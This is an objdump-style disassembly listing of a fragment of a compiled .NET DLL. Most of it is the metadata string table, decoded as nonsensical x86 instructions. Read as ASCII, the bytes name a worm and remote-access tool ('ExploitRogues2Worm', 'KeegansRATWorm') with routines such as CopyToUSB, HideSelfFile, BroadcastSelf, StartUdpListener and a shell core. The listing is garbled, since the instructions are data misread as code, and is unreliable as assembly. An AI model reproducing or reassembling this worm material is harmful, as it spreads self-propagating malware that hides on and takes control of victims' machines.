10002614:	d1 00                	roll   $1,(%eax)
10002616:	21 03                	and    %eax,(%ebx)
10002618:	22 00                	and    (%eax),%al
1000261a:	d1 00                	roll   $1,(%eax)
1000261c:	4a                   	dec    %edx
1000261d:	00 28                	add    %ch,(%eax)
1000261f:	00 d1                	add    %dl,%cl
10002621:	00 b4 04 06 00 d9 00 	add    %dh,0xd90006(%esp,%eax,1)
10002628:	fc                   	cld
10002629:	03 2d 00 d9 00 7c    	add    0x7c00d900,%ebp
1000262f:	00 32                	add    %dh,(%edx)
10002631:	00 e1                	add    %ah,%cl
10002633:	00 99 00 37 00 e9    	add    %bl,-0x16ffc900(%ecx)
10002639:	00 7f 03             	add    %bh,0x3(%edi)
1000263c:	3b 00                	cmp    (%eax),%eax
1000263e:	a1 00 21 03 06       	mov    0x6032100,%eax
10002643:	00 a1 00 44 04 4b    	add    %ah,0x4b044400(%ecx)
10002649:	00 a1 00 84 02 51    	add    %ah,0x51028400(%ecx)
1000264f:	00 f9                	add    %bh,%cl
10002651:	00 01                	add    %al,(%ecx)
10002653:	00 56 00             	add    %dl,0x0(%esi)
10002656:	f9                   	stc
10002657:	00 8d 03 5b 00 01    	add    %cl,0x1005b03(%ebp)
1000265d:	01 fd                	add    %edi,%ebp
1000265f:	00 61 00             	add    %ah,0x0(%ecx)
10002662:	09 01                	or     %eax,(%ecx)
10002664:	f5                   	cmc
10002665:	00 06                	add    %al,(%esi)
10002667:	00 a1 00 ef 00 06    	add    %ah,0x600ef00(%ecx)
1000266d:	00 d1                	add    %dl,%cl
1000266f:	00 0a                	add    %cl,(%edx)
10002671:	03 69 00             	add    0x0(%ecx),%ebp
10002674:	b1 00                	mov    $0x0,%cl
10002676:	96                   	xchg   %eax,%esi
10002677:	03 7a 00             	add    0x0(%edx),%edi
1000267a:	b1 00                	mov    $0x0,%cl
1000267c:	d1 00                	roll   $1,(%eax)
1000267e:	80 00 b1             	addb   $0xb1,(%eax)
10002681:	00 08                	add    %cl,(%eax)
10002683:	05 86 00 b1 00       	add    $0xb10086,%eax
10002688:	41                   	inc    %ecx
10002689:	05 8a 00 21 01       	add    $0x121008a,%eax
1000268e:	b2 00                	mov    $0x0,%dl
10002690:	37                   	aaa
10002691:	00 29                	add    %ch,(%ecx)
10002693:	01 c9                	add    %ecx,%ecx
10002695:	00 90 00 e9 00 2b    	add    %dl,0x2b00e900(%eax)
1000269b:	04 96                	add    $0x96,%al
1000269d:	00 e9                	add    %ch,%cl
1000269f:	00 18                	add    %bl,(%eax)
100026a1:	05 9b 00 e9 00       	add    $0xe9009b,%eax
100026a6:	eb 04                	jmp    0x100026ac
100026a8:	9b                   	fwait
100026a9:	00 59 00             	add    %bl,0x0(%ecx)
100026ac:	21 03                	and    %eax,(%ebx)
100026ae:	06                   	push   %es
100026af:	00 59 00             	add    %bl,0x0(%ecx)
100026b2:	c5 04 28             	lds    (%eax,%ebp,1),%eax
100026b5:	00 31                	add    %dh,(%ecx)
100026b7:	01 cf                	add    %ecx,%edi
100026b9:	04 aa                	add    $0xaa,%al
100026bb:	00 b9 00 21 03 af    	add    %bh,-0x50fcdf00(%ecx)
100026c1:	00 29                	add    %ch,(%ecx)
100026c3:	01 a6 00 b7 00 39    	add    %esp,0x3900b700(%esi)
100026c9:	01 32                	add    %esi,(%edx)
100026cb:	04 90                	add    $0x90,%al
100026cd:	00 59 00             	add    %bl,0x0(%ecx)
100026d0:	45                   	inc    %ebp
100026d1:	00 bc 00 59 00 21 03 	add    %bh,0x3210059(%eax,%eax,1)
100026d8:	01 00                	add    %eax,(%eax)
100026da:	31 01                	xor    %eax,(%ecx)
100026dc:	14 05                	adc    $0x5,%al
100026de:	aa                   	stos   %al,%es:(%edi)
100026df:	00 59 00             	add    %bl,0x0(%ecx)
100026e2:	e6 01                	out    %al,$0x1
100026e4:	d1 00                	roll   $1,(%eax)
100026e6:	f9                   	stc
100026e7:	00 16                	add    %dl,(%esi)
100026e9:	02 d9                	add    %cl,%bl
100026eb:	00 39                	add    %bh,(%ecx)
100026ed:	01 54 02 df          	add    %edx,-0x21(%edx,%eax,1)
100026f1:	00 39                	add    %bh,(%ecx)
100026f3:	01 57 04             	add    %edx,0x4(%edi)
100026f6:	e4 00                	in     $0x0,%al
100026f8:	39 01                	cmp    %eax,(%ecx)
100026fa:	53                   	push   %ebx
100026fb:	05 ed 00 49 01       	add    $0x14900ed,%eax
10002700:	2c 05                	sub    $0x5,%al
10002702:	f3 00 69 00          	repz add %ch,0x0(%ecx)
10002706:	bf 00 f7 00 51       	mov    $0x5100f700,%edi
1000270b:	00 21                	add    %ah,(%ecx)
1000270d:	03 06                	add    (%esi),%eax
1000270f:	00 20                	add    %ah,(%eax)
10002711:	00 4b 00             	add    %cl,0x0(%ebx)
10002714:	90                   	nop
10002715:	01 27                	add    %esp,(%edi)
10002717:	00 43 00             	add    %al,0x0(%ebx)
1000271a:	95                   	xchg   %eax,%ebp
1000271b:	01 2e                	add    %ebp,(%esi)
1000271d:	00 0b                	add    %cl,(%ebx)
1000271f:	00 19                	add    %bl,(%ecx)
10002721:	01 2e                	add    %ebp,(%esi)
10002723:	00 13                	add    %dl,(%ebx)
10002725:	00 22                	add    %ah,(%edx)
10002727:	01 2e                	add    %ebp,(%esi)
10002729:	00 1b                	add    %bl,(%ebx)
1000272b:	00 41 01             	add    %al,0x1(%ecx)
1000272e:	2e 00 23             	add    %ah,%cs:(%ebx)
10002731:	00 4a 01             	add    %cl,0x1(%edx)
10002734:	2e 00 2b             	add    %ch,%cs:(%ebx)
10002737:	00 56 01             	add    %dl,0x1(%esi)
1000273a:	2e 00 33             	add    %dh,%cs:(%ebx)
1000273d:	00 68 01             	add    %ch,0x1(%eax)
10002740:	2e 00 3b             	add    %bh,%cs:(%ebx)
10002743:	00 78 01             	add    %bh,0x1(%eax)
10002746:	42                   	inc    %edx
10002747:	00 6e 00             	add    %ch,0x0(%esi)
1000274a:	a1 00 c5 00 04       	mov    0x400c500,%eax
1000274f:	80 00 00             	addb   $0x0,(%eax)
10002752:	01 00                	add    %eax,(%eax)
	...
10002760:	95                   	xchg   %eax,%ebp
10002761:	02 00                	add    (%eax),%al
10002763:	00 09                	add    %cl,(%ecx)
	...
1000276d:	00 00                	add    %al,(%eax)
1000276f:	00 fc                	add    %bh,%ah
10002771:	00 27                	add    %ah,(%edi)
10002773:	00 00                	add    %al,(%eax)
10002775:	00 00                	add    %al,(%eax)
10002777:	00 09                	add    %cl,(%ecx)
	...
10002781:	00 00                	add    %al,(%eax)
10002783:	00 05 01 18 04 00    	add    %al,0x41801
10002789:	00 00                	add    %al,(%eax)
1000278b:	00 01                	add    %al,(%ecx)
	...
10002799:	00 1d 05 00 00 00    	add    %bl,0x5
1000279f:	00 09                	add    %cl,(%ecx)
	...
100027a9:	00 00                	add    %al,(%eax)
100027ab:	00 05 01 ce 02 00    	add    %al,0x2ce01
100027b1:	00 00                	add    %al,(%eax)
100027b3:	00 09                	add    %cl,(%ecx)
	...
100027bd:	00 00                	add    %al,(%eax)
100027bf:	00 05 01 a0 03 00    	add    %al,0x3a001
100027c5:	00 00                	add    %al,(%eax)
100027c7:	00 09                	add    %cl,(%ecx)
	...
100027d1:	00 00                	add    %al,(%eax)
100027d3:	00 05 01 e1 03 00    	add    %al,0x3e101
	...
100027e1:	67 65 74 5f          	addr16 gs je 0x10002844
100027e5:	55                   	push   %ebp
100027e6:	54                   	push   %esp
100027e7:	46                   	inc    %esi
100027e8:	38 00                	cmp    %al,(%eax)
100027ea:	3c 4d                	cmp    $0x4d,%al
100027ec:	6f                   	outsl  %ds:(%esi),(%dx)
100027ed:	64 75 6c             	fs jne 0x1000285c
100027f0:	65 3e 00 43 6f       	gs add %al,%ds:0x6f(%ebx)
100027f5:	70 79                	jo     0x10002870
100027f7:	54                   	push   %esp
100027f8:	6f                   	outsl  %ds:(%esi),(%dx)
100027f9:	55                   	push   %ebp
100027fa:	53                   	push   %ebx
100027fb:	42                   	inc    %edx
100027fc:	00 53 79             	add    %dl,0x79(%ebx)
100027ff:	73 74                	jae    0x10002875
10002801:	65 6d                	gs insl (%dx),%es:(%edi)
10002803:	2e 49                	cs dec %ecx
10002805:	4f                   	dec    %edi
10002806:	00 53 79             	add    %dl,0x79(%ebx)
10002809:	73 74                	jae    0x1000287f
1000280b:	65 6d                	gs insl (%dx),%es:(%edi)
1000280d:	2e 50                	cs push %eax
1000280f:	72 69                	jb     0x1000287a
10002811:	76 61                	jbe    0x10002874
10002813:	74 65                	je     0x1000287a
10002815:	2e 43                	cs inc %ebx
10002817:	6f                   	outsl  %ds:(%esi),(%dx)
10002818:	72 65                	jb     0x1000287f
1000281a:	4c                   	dec    %esp
1000281b:	69 62 00 54 68 72 65 	imul   $0x65726854,0x0(%edx),%esp
10002822:	61                   	popa
10002823:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
10002827:	6e                   	outsb  %ds:(%esi),(%dx)
10002828:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
1000282c:	74 5f                	je     0x1000288d
1000282e:	49                   	dec    %ecx
1000282f:	73 42                	jae    0x10002873
10002831:	61                   	popa
10002832:	63 6b 67             	arpl   %ebp,0x67(%ebx)
10002835:	72 6f                	jb     0x100028a6
10002837:	75 6e                	jne    0x100028a7
10002839:	64 00 49 44          	add    %cl,%fs:0x44(%ecx)
1000283d:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
10002844:	6c                   	insb   (%dx),%es:(%edi)
10002845:	65 00 48 69          	add    %cl,%gs:0x69(%eax)
10002849:	64 65 53             	fs gs push %ebx
1000284c:	65 6c                	gs insb (%dx),%es:(%edi)
1000284e:	66 46                	inc    %si
10002850:	69 6c 65 00 43 6f 6e 	imul   $0x736e6f43,0x0(%ebp,%eiz,2),%ebp
10002857:	73 
10002858:	6f                   	outsl  %ds:(%esi),(%dx)
10002859:	6c                   	insb   (%dx),%es:(%edi)
1000285a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
1000285e:	74 5f                	je     0x100028bf
10002860:	4d                   	dec    %ebp
10002861:	61                   	popa
10002862:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
10002869:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
1000286d:	6f                   	outsl  %ds:(%esi),(%dx)
1000286e:	63 65 73             	arpl   %esp,0x73(%ebp)
10002871:	73 4d                	jae    0x100028c0
10002873:	6f                   	outsl  %ds:(%esi),(%dx)
10002874:	64 75 6c             	fs jne 0x100028e3
10002877:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
1000287b:	74 5f                	je     0x100028dc
1000287d:	46                   	inc    %esi
1000287e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
10002885:	00 
10002886:	47                   	inc    %edi
10002887:	65 74 46             	gs je  0x100028d0
1000288a:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
10002891:	00 
10002892:	67 65 74 5f          	addr16 gs je 0x100028f5
10002896:	46                   	inc    %esi
10002897:	75 6c                	jne    0x10002905
10002899:	6c                   	insb   (%dx),%es:(%edi)
1000289a:	4e                   	dec    %esi
1000289b:	61                   	popa
1000289c:	6d                   	insl   (%dx),%es:(%edi)
1000289d:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
100028a1:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
100028a8:	00 
100028a9:	43                   	inc    %ebx
100028aa:	6f                   	outsl  %ds:(%esi),(%dx)
100028ab:	6d                   	insl   (%dx),%es:(%edi)
100028ac:	62 69 6e             	bound  %ebp,0x6e(%ecx)
100028af:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
100028b3:	74 5f                	je     0x10002914
100028b5:	44                   	inc    %esp
100028b6:	72 69                	jb     0x10002921
100028b8:	76 65                	jbe    0x1000291f
100028ba:	54                   	push   %esp
100028bb:	79 70                	jns    0x1000292d
100028bd:	65 00 43 53          	add    %al,%gs:0x53(%ebx)
100028c1:	68 61 72 70 53       	push   $0x53707261
100028c6:	68 65 6c 6c 43       	push   $0x436c6c65
100028cb:	6f                   	outsl  %ds:(%esi),(%dx)
100028cc:	72 65                	jb     0x10002933
100028ce:	00 43 6c             	add    %al,0x6c(%ebx)
100028d1:	6f                   	outsl  %ds:(%esi),(%dx)
100028d2:	73 65                	jae    0x10002939
100028d4:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
100028d8:	70 6f                	jo     0x10002949
100028da:	73 65                	jae    0x10002941
100028dc:	00 57 72             	add    %dl,0x72(%edi)
100028df:	69 74 65 00 53 54 41 	imul   $0x54415453,0x0(%ebp,%eiz,2),%esi
100028e6:	54 
100028e7:	68 72 65 61 64       	push   $0x64616572
100028ec:	41                   	inc    %ecx
100028ed:	74 74                	je     0x10002963
100028ef:	72 69                	jb     0x1000295a
100028f1:	62 75 74             	bound  %esi,0x74(%ebp)
100028f4:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
100028f9:	75 67                	jne    0x10002962
100028fb:	67 61                	addr16 popa
100028fd:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
10002901:	74 74                	je     0x10002977
10002903:	72 69                	jb     0x1000296e
10002905:	62 75 74             	bound  %esi,0x74(%ebp)
10002908:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
1000290c:	73 65                	jae    0x10002973
1000290e:	6d                   	insl   (%dx),%es:(%edi)
1000290f:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002913:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
1000291a:	72 
1000291b:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
10002922:	73 73                	jae    0x10002997
10002924:	65 6d                	gs insl (%dx),%es:(%edi)
10002926:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
1000292a:	65 73 63             	gs jae 0x10002990
1000292d:	72 69                	jb     0x10002998
1000292f:	70 74                	jo     0x100029a5
10002931:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
10002938:	69 62 75 74 65 00 52 	imul   $0x52006574,0x75(%edx),%esp
1000293f:	65 66 53             	gs push %bx
10002942:	61                   	popa
10002943:	66 65 74 79          	data16 gs je 0x100029c0
10002947:	52                   	push   %edx
10002948:	75 6c                	jne    0x100029b6
1000294a:	65 73 41             	gs jae 0x1000298e
1000294d:	74 74                	je     0x100029c3
1000294f:	72 69                	jb     0x100029ba
10002951:	62 75 74             	bound  %esi,0x74(%ebp)
10002954:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10002958:	6d                   	insl   (%dx),%es:(%edi)
10002959:	70 69                	jo     0x100029c4
1000295b:	6c                   	insb   (%dx),%es:(%edi)
1000295c:	61                   	popa
1000295d:	74 69                	je     0x100029c8
1000295f:	6f                   	outsl  %ds:(%esi),(%dx)
10002960:	6e                   	outsb  %ds:(%esi),(%dx)
10002961:	52                   	push   %edx
10002962:	65 6c                	gs insb (%dx),%es:(%edi)
10002964:	61                   	popa
10002965:	78 61                	js     0x100029c8
10002967:	74 69                	je     0x100029d2
10002969:	6f                   	outsl  %ds:(%esi),(%dx)
1000296a:	6e                   	outsb  %ds:(%esi),(%dx)
1000296b:	73 41                	jae    0x100029ae
1000296d:	74 74                	je     0x100029e3
1000296f:	72 69                	jb     0x100029da
10002971:	62 75 74             	bound  %esi,0x74(%ebp)
10002974:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002978:	73 65                	jae    0x100029df
1000297a:	6d                   	insl   (%dx),%es:(%edi)
1000297b:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
1000297f:	72 6f                	jb     0x100029f0
10002981:	64 75 63             	fs jne 0x100029e7
10002984:	74 41                	je     0x100029c7
10002986:	74 74                	je     0x100029fc
10002988:	72 69                	jb     0x100029f3
1000298a:	62 75 74             	bound  %esi,0x74(%ebp)
1000298d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002991:	73 65                	jae    0x100029f8
10002993:	6d                   	insl   (%dx),%es:(%edi)
10002994:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002998:	6f                   	outsl  %ds:(%esi),(%dx)
10002999:	6d                   	insl   (%dx),%es:(%edi)
1000299a:	70 61                	jo     0x100029fd
1000299c:	6e                   	outsb  %ds:(%esi),(%dx)
1000299d:	79 41                	jns    0x100029e0
1000299f:	74 74                	je     0x10002a15
100029a1:	72 69                	jb     0x10002a0c
100029a3:	62 75 74             	bound  %esi,0x74(%ebp)
100029a6:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
100029aa:	6e                   	outsb  %ds:(%esi),(%dx)
100029ab:	74 69                	je     0x10002a16
100029ad:	6d                   	insl   (%dx),%es:(%edi)
100029ae:	65 43                	gs inc %ebx
100029b0:	6f                   	outsl  %ds:(%esi),(%dx)
100029b1:	6d                   	insl   (%dx),%es:(%edi)
100029b2:	70 61                	jo     0x10002a15
100029b4:	74 69                	je     0x10002a1f
100029b6:	62 69 6c             	bound  %ebp,0x6c(%ecx)
100029b9:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
100029c0:	69 
100029c1:	62 75 74             	bound  %esi,0x74(%ebp)
100029c4:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
100029c8:	63 65 69             	arpl   %esp,0x69(%ebp)
100029cb:	76 65                	jbe    0x10002a32
100029cd:	00 42 72             	add    %al,0x72(%edx)
100029d0:	6f                   	outsl  %ds:(%esi),(%dx)
100029d1:	61                   	popa
100029d2:	64 63 61 73          	arpl   %esp,%fs:0x73(%ecx)
100029d6:	74 53                	je     0x10002a2b
100029d8:	65 6c                	gs insb (%dx),%es:(%edi)
100029da:	66 00 53 79          	data16 add %dl,0x79(%ebx)
100029de:	73 74                	jae    0x10002a54
100029e0:	65 6d                	gs insl (%dx),%es:(%edi)
100029e2:	2e 54                	cs push %esp
100029e4:	68 72 65 61 64       	push   $0x64616572
100029e9:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
100029f0:	6f                   	outsl  %ds:(%esi),(%dx)
100029f1:	64 69 6e 67 00 47 65 	imul   $0x74654700,%fs:0x67(%esi),%ebp
100029f8:	74 
100029f9:	53                   	push   %ebx
100029fa:	74 72                	je     0x10002a6e
100029fc:	69 6e 67 00 53 61 76 	imul   $0x76615300,0x67(%esi),%ebp
10002a03:	65 46                	gs inc %esi
10002a05:	69 6c 65 44 69 61 6c 	imul   $0x6f6c6169,0x44(%ebp,%eiz,2),%ebp
10002a0c:	6f 
10002a0d:	67 00 4f 70          	add    %cl,0x70(%bx)
10002a11:	65 6e                	outsb  %gs:(%esi),(%dx)
10002a13:	46                   	inc    %esi
10002a14:	69 6c 65 44 69 61 6c 	imul   $0x6f6c6169,0x44(%ebp,%eiz,2),%ebp
10002a1b:	6f 
10002a1c:	67 00 4f 70          	add    %cl,0x70(%bx)
10002a20:	65 6e                	outsb  %gs:(%esi),(%dx)
10002a22:	46                   	inc    %esi
10002a23:	6f                   	outsl  %ds:(%esi),(%dx)
10002a24:	6c                   	insb   (%dx),%es:(%edi)
10002a25:	64 65 72 44          	fs gs jb 0x10002a6d
10002a29:	69 61 6c 6f 67 00 50 	imul   $0x5000676f,0x6c(%ecx),%esp
10002a30:	61                   	popa
10002a31:	74 68                	je     0x10002a9b
10002a33:	00 53 74             	add    %dl,0x74(%ebx)
10002a36:	61                   	popa
10002a37:	72 74                	jb     0x10002aad
10002a39:	73 57                	jae    0x10002a92
10002a3b:	69 74 68 00 45 78 70 	imul   $0x6c707845,0x0(%eax,%ebp,2),%esi
10002a42:	6c 
10002a43:	6f                   	outsl  %ds:(%esi),(%dx)
10002a44:	69 74 52 6f 67 75 65 	imul   $0x73657567,0x6f(%edx,%edx,2),%esi
10002a4b:	73 
10002a4c:	32 57 6f             	xor    0x6f(%edi),%dl
10002a4f:	72 6d                	jb     0x10002abe
10002a51:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
10002a54:	6c                   	insb   (%dx),%es:(%edi)
10002a55:	00 4e 65             	add    %cl,0x65(%esi)
10002a58:	74 77                	je     0x10002ad1
10002a5a:	6f                   	outsl  %ds:(%esi),(%dx)
10002a5b:	72 6b                	jb     0x10002ac8
10002a5d:	53                   	push   %ebx
10002a5e:	74 72                	je     0x10002ad2
10002a60:	65 61                	gs popa
10002a62:	6d                   	insl   (%dx),%es:(%edi)
10002a63:	00 47 65             	add    %al,0x65(%edi)
10002a66:	74 53                	je     0x10002abb
10002a68:	74 72                	je     0x10002adc
10002a6a:	65 61                	gs popa
10002a6c:	6d                   	insl   (%dx),%es:(%edi)
10002a6d:	00 53 79             	add    %dl,0x79(%ebx)
10002a70:	73 74                	jae    0x10002ae6
10002a72:	65 6d                	gs insl (%dx),%es:(%edi)
10002a74:	00 45 78             	add    %al,0x78(%ebp)
10002a77:	70 6c                	jo     0x10002ae5
10002a79:	6f                   	outsl  %ds:(%esi),(%dx)
10002a7a:	69 74 52 6f 67 75 65 	imul   $0x73657567,0x6f(%edx,%edx,2),%esi
10002a81:	73 
10002a82:	32 57 6f             	xor    0x6f(%edi),%dl
10002a85:	72 6d                	jb     0x10002af4
10002a87:	00 4b 65             	add    %cl,0x65(%ebx)
10002a8a:	65 67 61             	gs addr16 popa
10002a8d:	6e                   	outsb  %ds:(%esi),(%dx)
10002a8e:	73 52                	jae    0x10002ae2
10002a90:	41                   	inc    %ecx
10002a91:	54                   	push   %esp
10002a92:	57                   	push   %edi
10002a93:	6f                   	outsl  %ds:(%esi),(%dx)
10002a94:	72 6d                	jb     0x10002b03
10002a96:	00 4d 61             	add    %cl,0x61(%ebp)
10002a99:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
10002aa0:	65 6d                	gs insl (%dx),%es:(%edi)
10002aa2:	2e 52                	cs push %edx
10002aa4:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
10002aa7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10002aac:	6e                   	outsb  %ds:(%esi),(%dx)
10002aad:	00 53 79             	add    %dl,0x79(%ebx)
10002ab0:	73 74                	jae    0x10002b26
10002ab2:	65 6d                	gs insl (%dx),%es:(%edi)
10002ab4:	2e 49                	cs dec %ecx
10002ab6:	4f                   	dec    %edi
10002ab7:	2e 46                	cs inc %esi
10002ab9:	69 6c 65 53 79 73 74 	imul   $0x65747379,0x53(%ebp,%eiz,2),%ebp
10002ac0:	65 
10002ac1:	6d                   	insl   (%dx),%es:(%edi)
10002ac2:	2e 44                	cs inc %esp
10002ac4:	72 69                	jb     0x10002b2f
10002ac6:	76 65                	jbe    0x10002b2d
10002ac8:	49                   	dec    %ecx
10002ac9:	6e                   	outsb  %ds:(%esi),(%dx)
10002aca:	66 6f                	outsw  %ds:(%esi),(%dx)
10002acc:	00 46 69             	add    %al,0x69(%esi)
10002acf:	6c                   	insb   (%dx),%es:(%edi)
10002ad0:	65 53                	gs push %ebx
10002ad2:	79 73                	jns    0x10002b47
10002ad4:	74 65                	je     0x10002b3b
10002ad6:	6d                   	insl   (%dx),%es:(%edi)
10002ad7:	49                   	dec    %ecx
10002ad8:	6e                   	outsb  %ds:(%esi),(%dx)
10002ad9:	66 6f                	outsw  %ds:(%esi),(%dx)
10002adb:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
10002adf:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
10002ae4:	79 49                	jns    0x10002b2f
10002ae6:	6e                   	outsb  %ds:(%esi),(%dx)
10002ae7:	66 6f                	outsw  %ds:(%esi),(%dx)
10002ae9:	00 53 6c             	add    %dl,0x6c(%ebx)
10002aec:	65 65 70 00          	gs gs jo 0x10002af0
10002af0:	53                   	push   %ebx
10002af1:	74 61                	je     0x10002b54
10002af3:	72 74                	jb     0x10002b69
10002af5:	55                   	push   %ebp
10002af6:	64 70 4c             	fs jo  0x10002b45
10002af9:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
10002b00:	00 2e                	add    %ch,(%esi)
10002b02:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
10002b06:	00 2e                	add    %ch,(%esi)
10002b08:	63 63 74             	arpl   %esp,0x74(%ebx)
10002b0b:	6f                   	outsl  %ds:(%esi),(%dx)
10002b0c:	72 00                	jb     0x10002b0e
10002b0e:	53                   	push   %ebx
10002b0f:	79 73                	jns    0x10002b84
10002b11:	74 65                	je     0x10002b78
10002b13:	6d                   	insl   (%dx),%es:(%edi)
10002b14:	2e 44                	cs inc %esp
10002b16:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
10002b1d:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
10002b24:	74 65                	je     0x10002b8b
10002b26:	6d                   	insl   (%dx),%es:(%edi)
10002b27:	2e 52                	cs push %edx
10002b29:	75 6e                	jne    0x10002b99
10002b2b:	74 69                	je     0x10002b96
10002b2d:	6d                   	insl   (%dx),%es:(%edi)
10002b2e:	65 2e 43             	gs cs inc %ebx
10002b31:	6f                   	outsl  %ds:(%esi),(%dx)
10002b32:	6d                   	insl   (%dx),%es:(%edi)
10002b33:	70 69                	jo     0x10002b9e
10002b35:	6c                   	insb   (%dx),%es:(%edi)
10002b36:	65 72 53             	gs jb  0x10002b8c
10002b39:	65 72 76             	gs jb  0x10002bb2
10002b3c:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
10002b43:	62 75 67             	bound  %esi,0x67(%ebp)
10002b46:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
10002b4d:	65 
10002b4e:	73 00                	jae    0x10002b50
10002b50:	46                   	inc    %esi
10002b51:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
10002b58:	69 
10002b59:	62 75 74             	bound  %esi,0x74(%ebp)
10002b5c:	65 73 00             	gs jae 0x10002b5f
10002b5f:	53                   	push   %ebx
10002b60:	65 74 41             	gs je  0x10002ba4
10002b63:	74 74                	je     0x10002bd9
10002b65:	72 69                	jb     0x10002bd0
10002b67:	62 75 74             	bound  %esi,0x74(%ebp)
10002b6a:	65 73 00             	gs jae 0x10002b6d
10002b6d:	47                   	inc    %edi
10002b6e:	65 74 42             	gs je  0x10002bb3
10002b71:	79 74                	jns    0x10002be7
10002b73:	65 73 00             	gs jae 0x10002b76
10002b76:	47                   	inc    %edi
10002b77:	65 74 44             	gs je  0x10002bbe
10002b7a:	72 69                	jb     0x10002be5
10002b7c:	76 65                	jbe    0x10002be3
10002b7e:	73 00                	jae    0x10002b80
10002b80:	53                   	push   %ebx
10002b81:	79 73                	jns    0x10002bf6
10002b83:	74 65                	je     0x10002bea
10002b85:	6d                   	insl   (%dx),%es:(%edi)
10002b86:	2e 4e                	cs dec %esi
10002b88:	65 74 2e             	gs je  0x10002bb9
10002b8b:	50                   	push   %eax
10002b8c:	72 69                	jb     0x10002bf7
10002b8e:	6d                   	insl   (%dx),%es:(%edi)
10002b8f:	69 74 69 76 65 73 00 	imul   $0x43007365,0x76(%ecx,%ebp,2),%esi
10002b96:	43 
10002b97:	53                   	push   %ebx
10002b98:	68 61 72 70 53       	push   $0x53707261
10002b9d:	68 65 6c 6c 43       	push   $0x436c6c65
10002ba2:	6f                   	outsl  %ds:(%esi),(%dx)
10002ba3:	72 65                	jb     0x10002c0a
10002ba5:	2e 44                	cs inc %esp
10002ba7:	69 61 6c 6f 67 73 00 	imul   $0x73676f,0x6c(%ecx),%esp
10002bae:	53                   	push   %ebx
10002baf:	74 72                	je     0x10002c23
10002bb1:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
10002bb8:	74 4f                	je     0x10002c09
10002bba:	70 74                	jo     0x10002c30
10002bbc:	69 6f 6e 73 00 53 79 	imul   $0x79530073,0x6e(%edi),%ebp
10002bc3:	73 74                	jae    0x10002c39
10002bc5:	65 6d                	gs insl (%dx),%es:(%edi)
10002bc7:	2e 44                	cs inc %esp
10002bc9:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
10002bd0:	69 63 73 2e 50 72 6f 	imul   $0x6f72502e,0x73(%ebx),%esp
10002bd7:	63 65 73             	arpl   %esp,0x73(%ebp)
10002bda:	73 00                	jae    0x10002bdc
10002bdc:	47                   	inc    %edi
10002bdd:	65 74 43             	gs je  0x10002c23
10002be0:	75 72                	jne    0x10002c54
10002be2:	72 65                	jb     0x10002c49
10002be4:	6e                   	outsb  %ds:(%esi),(%dx)
10002be5:	74 50                	je     0x10002c37
10002be7:	72 6f                	jb     0x10002c58
10002be9:	63 65 73             	arpl   %esp,0x73(%ebp)
10002bec:	73 00                	jae    0x10002bee
10002bee:	49                   	dec    %ecx
10002bef:	50                   	push   %eax
10002bf0:	41                   	inc    %ecx
10002bf1:	64 64 72 65          	fs fs jb 0x10002c5a
10002bf5:	73 73                	jae    0x10002c6a
10002bf7:	00 53 79             	add    %dl,0x79(%ebx)
10002bfa:	73 74                	jae    0x10002c70
10002bfc:	65 6d                	gs insl (%dx),%es:(%edi)
10002bfe:	2e 4e                	cs dec %esi
10002c00:	65 74 2e             	gs je  0x10002c31
10002c03:	53                   	push   %ebx
10002c04:	6f                   	outsl  %ds:(%esi),(%dx)
10002c05:	63 6b 65             	arpl   %ebp,0x65(%ebx)
10002c08:	74 73                	je     0x10002c7d
10002c0a:	00 45 78             	add    %al,0x78(%ebp)
